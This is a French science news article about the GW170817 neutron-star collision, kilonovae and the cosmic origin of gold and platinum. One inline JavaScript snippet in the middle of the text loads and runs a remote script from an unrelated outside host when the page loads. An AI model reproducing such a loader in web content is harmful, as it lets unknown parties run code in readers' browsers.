{"title": "Ondes gravitationnelles : une collision d'étoiles à neutrons produit plus de 100 Terre en or", "newspaper": "Futura Sciences", "author": "Laurent Sacco", "date_publi": "17/10/2017", "content": "L'origine énigmatique de l'or des Incas et des alliances n'a finalement pas échappé à la sagacité des alchimistes stellaires que sont les astrophysiciens. Cet élément mythique serait bien largement produit par les collisions d'étoiles à neutrons, collisions qui s'accompagnent de kilonovae émettrices d'ondes gravitationnelles détectées par Ligo et Virgo. Ce qu'il faut retenir Dans la zone du ciel d'où provenaient les ondes gravitationnelles detéctées par Ligo et Virgo le 17 août dernier, des instruments du monde entier ont identifié une source d'ondes électromagnétiques, dans le visible notamment, située dans la galaxie NGC 4993, à 130 millions d'années-lumière. L'évènement est important sur le plan technique car deux signaux, issus du même phénomène mais de natures différentes (ondes gravitationnelles et ondes électromagnétiques), ont été observés. Scientifiquement, il confirme que les sursauts gamma courts (ou au moins certains d'entre eux) sont bien engendrés par des fusions d'étoiles à neutrons, que les « kilonovae » existent et que là se trouve la source d'atomes lourds comme l'or ou le platine. Deux étoiles à neutrons fusionnent en un trou noir                       Dans cette animation (ce n'est pas une observation), la Nasa montre ce que l'on pense être la collision de deux étoiles à neutrons qui formaient un couple, l'une tournant de l'autre. Résultant de l'effondrement d'une grosse étoile, ces astres sont extrêmement denses. Quand les deux corps se rapprochent trop, les forces de marée commencent à les déchirer. Les zones rouges montrent les régions de plus faible densité. La fusion donne un corps si dense qu'il devient un trou noir. Ce scénario a été validé en octobre 2017 par l'analyse d'ondes gravitationnelles repérées par Ligo et Virgo en août 2017 issues de la source baptisée GW170817. © Nasa                                        C'est un déluge d'informations de toutes sortes qui s'abat actuellement dans la communauté scientifique avec l'annonce de la détection d'une nouvelle onde gravitationnelle par les membres des collaborations  Ligo  et  Virgo . Cataloguée comme la source GW170817, elle met en ébullition les astrophysiciens relativistes utilisant la théorie de la  relativité générale d’Einstein  mais probablement plus encore les astrophysiciens nucléaires qui cherchent depuis les années 1950 l'origine des éléments chimiques.  Les premiers voient dans GW170817 et l'analyse de l'onde qu'elle a générée l'ouverture d'une nouvelle fenêtre sur la  physique  des  étoiles à neutrons . Ces  astres  sont transparents aux  ondes gravitationnelles  qu'ils émettent et qui portent codées en elles de nombreuses informations sur leur structure et leur composition. Extrêmement compacts, d'un diamètre de quelques dizaines de kilomètres, ils sont si denses qu'une cuillère à café de leur matière peut peser jusqu'à un milliard de tonnes environ. La saga de la détection de GW170817. Pour obtenir une traduction en français assez fidèle, cliquez sur le rectangle blanc en bas à droite. Les sous-titres en anglais devraient alors apparaître. Cliquez ensuite sur l'écrou à droite du rectangle, puis sur « Sous-titres » et enfin sur « Traduire automatiquement ». Choisissez « Français ». © Science vs Cinema  Les kilonovae, clés de l'astrophysique nucléaire Les astrophysiciens nucléaires, eux, grâce au fait que GW170817 est également apparu comme une source dans le domaine des  ondes électromagnétiques , viennent d'avoir pour la première fois la confirmation que des  sursauts  gamma courts sont bien, comme on s'y attendait, des collisions d'étoiles à neutrons qui fusionnent en donnant un astre encore plus compact, très vraisemblablement un trou noir. Mais dans l'opération, les forces de marée de ces étoiles à neutrons conduisent à une dislocation d'une partie de leur matière, éjectée dans le milieu interstellaire.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Or, selon les astrophysiciens nucléaires, ces processus s'accompagnent d'intenses flux de neutrons qui vont être capturés par les noyaux présents dans les étoiles à neutrons et réagir en donnant d'autres noyaux plus lourds que le  fer . Ce phénomène était postulé pour expliquer les abondances de noyaux d'or et de  platine  dans la  Voie lactée  et, bien évidemment, sur  Terre . En effet, les valeurs observées ne peuvent s'expliquer par l'évolution chimique de notre  galaxie , résultant  d'explosions plus classiques, celles des supernovae SN II, qui produisent aussi des éléments plus lourds que le fer et qui les dispersent dans le milieu interstellaire. Des modèles de productions de ces éléments lourds avaient été construits depuis plusieurs années et ils étaient étudiés numériquement avec des  superordinateurs  qui reproduisaient les collisions d'étoiles à neutrons. L'astrophysicien Daniel Kasen, en poste au  Lawrence Berkeley National Laboratory  (plus simplement Berkeley Lab) et à l'université de Berkeley, a fait partie des chercheurs qui se sont penchés sur cette question de l'origine des éléments lourds. Chaque kilonova pourrait produire une masse d'or égale à des centaines de fois celle de la Terre Si bien que lorsque le réseau d'alertes informatiques s'est enflammé à l'annonce d'une possible observation d'étoiles à neutrons nécessitant la mobilisation des plusieurs instruments, sur Terre et dans l'espace, pour observer à toutes les longueurs d'onde électromagnétiques, la tension de Kasen est montée d'un cran.  « Pendant des années, nous avions étudié à quoi ressembleraient les collisions d'étoiles à neutrons en collision, sans autre moyen que notre imagination théorique et la modélisation informatique , rappelle le chercheur.  Maintenant, les vraies données étaient en train de couler à flots, et cella allait nous permettre de tester tout ce que nous avions prévu. » Ces modèles avaient notamment prévu que l'explosion résultant de la collision des étoiles neutrons donnerait ce que les astrophysiciens avaient appelé une kilonova, ou, parfois, macronova. Certains des éléments lourds produits étant radioactifs, le nuage de matière laissé par l'évènement devrait être au moins dix millions de fois plus brillant que le Soleil pendant quelque temps. Initialement sous la forme de sortes de champignons atomiques de la taille d'une ville, ce nuage devrait atteindre la dimension du Système solaire au bout d'un jour. Vraisemblablement, il ne devrait cependant contenir que quelques pourcents de la  masse  initiale des deux objets, le reste s'effondrant probablement pour donner un  trou noir . “ C'est un de ces évènements astronomiques qui marque toute une vie. Ce tableau des éléments chimiques montrent les parts relatives des objets astrophysiques dans la nucléosynthèse. Certains noyaux sont produits par les supernovae SN II (bleu marine), d'autres par les naines blanches ( White Dwarfs ) lors des supernovae SN Ia et d'autres surtout par les collisions d'étoiles à neutrons comme l'or (Au). © Jennifer Johnson, SDSS, cc by 2.0                                Il n'en reste pas moins que selon les calculs, l'équivalent de plusieurs centaines de fois la masse de la Terre sous forme de noyaux d'or serait produit à chacun de ces évènements et injecté dans le milieu interstellaire dans une galaxie, selon Daniel Kasen. En plus de cet or, une masse de platine probablement 500 fois plus grande que celle de notre planète devrait être générée... Selon le chercheur, ce scénario vient de gagner fortement en crédibilité car les observations à de multiples longueurs d'onde qui ont suivi pendant des jours et des semaines la détection de GW170817 confirment remarquablement bien, pour le moment, le travail des théoriciens et les  simulations numériques  effectuées. « Pour moi, c'est un de ces évènements astronomiques qui marque toute une vie , a déclaré Kasen.  C'est aussi un moment incroyable pour le domaine de l'informatique scientifique. Les simulations numériques sur ordinateur ont réussi à modéliser ce qui pouvait se passer lors d'un phénomène aussi incroyablement complexe qu'une  fusion  d'étoiles à neutrons. Sans ces modèles numériques, nous serions probablement encore tous été mystifiés par ce que nous voyions dans le ciel. » Pour en savoir plus Ondes gravitationnelles : grande première avec l'observation d'une fusion d'étoiles à neutrons Article de Laurent Sacco publié le 16 octobre 2017 Spectaculaire révélation venue de Ligo, de Virgo, de l' ESA  et de l' ESO  : des ondes gravitationnelles détectées le 17 août 2017 provenaient de la fusion d'étoiles à neutrons, et non de  trous noirs . Mieux : l'évènement a été repéré aussi par 70 instruments, spatiaux et terrestres, dans le visible, l' infrarouge  et le domaine gamma, ce qui en fait une observation « multimessagers ». Au passage, il confirme que ce genre de collision est bien à l'origine des énigmatiques « sursauts gamma courts ». La découverte ouvre une nouvelle ère : celle de l'astronomie gravitationnelle couplée au travail d'instruments classiques. Et pourquoi pas aussi à la détection de  neutrinos  ? La nouvelle était tellement extraordinaire que l'astrophysicien J. Craig Wheeler, de l'université du Texas à Austin (là où enseignait la regrettée  Cécile DeWitt-Morette ), n'avait pas pu tenir sa langue le 18 août 2017 sur  Twitter . Non seulement les détecteurs d'ondes gravitationelles Ligo et Virgo avaient vu une nouvelle source mais, selon les rumeurs entendues par Wheeler, il existait en prime des observations de cet évènement dans le  spectre  électromagnétique. Bien que non confirmée, la nouvelle s'était rapidement propagée dans la communauté scientifique au point de donner lieu à un article dans la revue  Nature . Il semblait bien que plusieurs  télescopes , dont  Hubble , dans le visible, ainsi que  Fermi  et  Chandra  dans les domaines gamma et X, respectivement, aient été mobilisés pour observer la galaxie  NGC  4993, située à 130 millions d' années-lumière  de la  Voie lactée  dans la  constellation  de l' Hydre  de l' hémisphère austral .  Une chose était certaine : Chandra avait bien observé dans cette galaxie un  sursaut gamma court  initialement détecté par Fermi, en l'occurrence SGRB170817A, qui était survenu le 17 août 2017, comme son nom l'indique (GRB veut dire  Gamma Ray Burst , donc sursaut gamma en anglais). Les astrophysiciens pensent depuis un moment que les sursauts gamma courts sont probablement des «  kilonovae  », des petites supernovae en quelque sorte mais générées par des collisions d'étoiles à neutrons. Or, ces collisions sont précisément les sources d'ondes gravitationnelles que l'on pensait détecter en premier avec Ligo et Virgo. En effet, bien que ces collisions soient moins puissantes en intensité que celles de  trous noirs stellaires , elles sont censément plus fréquentes. Une vidéo de présentation de Virgo et de la chasse aux ondes gravitationnelles. © CNRS Calculs et observations convergent vers deux étoiles à neutrons Cependant, l'annonce de la détection conjointe par Ligo et Virgo le 14 août 2017 de  GW170814  (GW, pour  Gravitational Wave , c'est-à-dire onde gravitationnelle), un signal provenant à nouveau d'une fusion de trous noirs stellaires mais sans contrepartie électromagnétique, semblait avoir mis fin à toutes les rumeurs. Erreur, comme le prouve aujourd'hui une salve de communiqués provenant des collaborations Ligo et Virgo mais aussi des astronomes de l'ESO et de l'ESA. Avec le  VLT  et  Integral , ces derniers annoncent que SGRB170817A semble bel et bien accompagner une nouvelle source d'ondes gravitationnelles que les observations de Ligo et Virgo permettent de localiser dans l'espace et dans le temps avec NGC 4993. Baptisée GW170817, elle a été détectée directement sur Terre le 17 août 2017 précisément à 14 heures 41 minutes (heure de Paris). Le signal détecté est bien trop long — une centaine de secondes — pour avoir été produit par une fusion de  trous noirs  (il n'aurait duré qu'une fraction de seconde). Il s'agissait nécessairement d'astres moins massifs et moins compacts, émettant moins intensément et moins rapidement de l' énergie  sous forme d'ondes gravitationnelles. De ce fait, l'ultime phase de rapprochement des deux objets est moins rapide, ce qui allonge d'autant la  durée  de forte  luminosité  gravitationnelle. Là aussi, notamment grâce à des simulations numériques sur superordinateurs, il est possible de remonter de la forme de l'onde gravitationnelle aux caractéristiques des astres compacts qui l'ont produite lors d'une collision et d'une fusion. Ainsi, la catastrophe cosmique survenue dans NGC 4993 résulte de la collision de deux étoiles à neutrons contenant vraisemblablement respectivement entre 1,1 et 1,6 masse solaire. Le saviez-vous ? Les étoiles à neutrons sont petites (quelques dizaines de kilomètres) mais aussi massives qu'une étoile et vivent parfois en couple. Les deux peuvent alors finir par se rapprocher et entrer en collision, émettant une puissante émission électromagnétique dans tout le spectre. Prédit théoriquement et probablement assez fréquent, ce phénomène n'avait jamais été observé. L'hypothèse était qu'il correspondait à des sursauts gamma courts, ces brèves bouffées de rayons gamma qui se manifestent au rythme d'un par semaine dans notre ciel. Futura avait consacré deux articles aux étoiles à neutrons, dont un entretien avec Éric Gourgoulhon, un des grands spécialistes français. Ces objets fascinants sont des résidus possibles de l'évolution stellaire des  soleils  contenant plus de huit masses solaires et qui explosent en supernovae. Ces astres peuvent concentrer entre une et trois masses solaires dans une sphère de quelques dizaines de kilomètres de diamètre, riche en noyaux de fer et en neutrons. Nous renvoyons le lecteur vers ces articles pour faire connaissance plus en profondeur avec les étoiles à neutrons, dont l'étude convoque presque toute la physique et qui, en retour, fournissent un formidable laboratoire naturel de physique fondamentale. Voir aussi : Record de masse pour une étoile à neutrons Voir aussi : Un peu moins de mystères dans le cœur des étoiles à neutrons Pour la physique des ondes gravitationnelles et leur détection, nous renvoyons aux commentaires de  Jean-Pierre Luminet  sur son  blog  hébergé chez Futura :  Voir aussi : Toute la lumière sur l'onde gravitationnelle avec Jean-Pierre Luminet Des explications pour les kilonovae, les sursauts gamma courts, l'or et le platine... GW170817 et SGRB170817A sont donc les deux faces d'une même découverte aux multiples conséquences. Elle confirme déjà l'entrée dans une nouvelle ère, celle de l'astronomie gravitationnelle. Elle ouvre aussi une nouvelle phase de astronomie « multi-messagers » déjà inaugurée par la détection conjointe des  photons  et des neutrinos de la fameuse  supernova  de 1987. On peut penser que dans un avenir rapproché, par exemple à l'occasion d'une collision similaire d'étoiles à neutrons ou de l'explosion d'une supernova donnant un  trou noir  dans la Voie lactée, trois messagers pourront être combinés : les ondes gravitationnelles, les ondes électromagnétiques et les neutrinos. Qui sait quelles percées révolutionnaires en physique et en  astrophysique  pourraient en découler ? Pour l'heure, et pour la première fois, nous avons une preuve  solide  de l'existence des kilonovae et surtout du fait qu'au moins certains sursauts gamma courts sont bien des collisions d'étoiles à neutrons. Cela accrédite donc un scénario proposé pour rendre compte d'une énigme de l'astrophysique nucléaire, celles des abondances de noyaux d'or et de platine difficiles à expliquer par la seule évolution cosmochimique des éléments lourds dans les galaxies basée sur les supernovae. Ces noyaux proviendraient bien de l'addition rapide de neutrons dans des noyaux de plus en plus lourds à partir des noyaux de fer, donnant parfois des  protons  par  désintégration bêta . Une dizaine de publications va accompagner cette découverte, donnant la mesure de la justesse de l'attribution du  prix Nobel de physique 2017  aux physiciens états-uniens Rainer Weiss, Kip S. Thorne et Barry C. Barish et dont il serait étonnant qu'elles ne contribuent pas à l'attribution du prix pour 2018 aux Français  Alain Brillet et Thibault Damour . ", "theme": "sciences"}